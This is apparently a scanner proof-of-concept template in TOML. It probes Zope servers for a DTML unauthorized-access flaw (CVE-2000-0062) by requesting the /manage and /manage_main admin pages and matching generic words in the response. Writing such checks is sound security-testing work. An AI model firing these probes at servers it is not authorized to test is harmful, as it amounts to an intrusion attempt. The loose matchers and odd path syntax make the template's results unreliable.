[info]
author = "AVE"
description = "检测 Zope 对象发布环境中 DTML 实现的权限绕过漏洞（CVE-2000-0062）。通过向目标 Zope 服务器发送 HTTP 请求，尝试直接访问管理界面和 DTML 方法，验证是否存在未授权访问缺陷。漏洞影响 Zope 2.2.0 至 2.2.4 版本，CVSS 10.0。"
id = "POC-AVE-2000-0200"
name = "Zope DTML 远程未授权操作漏洞 PoC"
severity = "critical"
tags = [
    "cve-2000-0062",
    "zope",
    "dtml",
    "authentication-bypass",
]
vuln_id = [
    "CVE-2000-0062",
    "AVE-2000-0200",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/manage"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Zope",
    "manage_workspace",
    "Manage",
    "DTML",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/manage_main"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Zope",
    "manage",
    "login",
]
